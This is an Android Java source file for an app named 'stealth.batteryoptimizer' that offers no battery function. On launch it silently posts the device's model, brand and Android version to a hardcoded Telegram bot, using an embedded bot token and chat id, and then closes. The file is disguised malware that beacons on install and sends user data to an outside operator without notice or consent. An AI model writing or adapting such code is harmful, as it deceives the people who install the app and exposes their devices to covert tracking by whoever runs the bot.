package com.stealth.batteryoptimizer;

import android.app.Activity;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Bundle;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import org.json.JSONObject;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        new SendTelegramTask().execute();
    }

    private class SendTelegramTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            try {
                String botToken = "8108088889:AAG_4bdHKG7GFF1rFTJW9I96rHVE7oFYq2Y";
                String chatId = "7886863810";
                String messageText = "[BatteryOptimizer Installed]\nModel: " + Build.MODEL +
                        "\nBrand: " + Build.BRAND +
                        "\nAndroid: " + Build.VERSION.RELEASE;

                String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";

                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject payload = new JSONObject();
                payload.put("chat_id", chatId);
                payload.put("text", messageText);

                OutputStream os = conn.getOutputStream();
                os.write(payload.toString().getBytes());
                os.flush();
                os.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
            finish();
            return null;
        }
    }
}
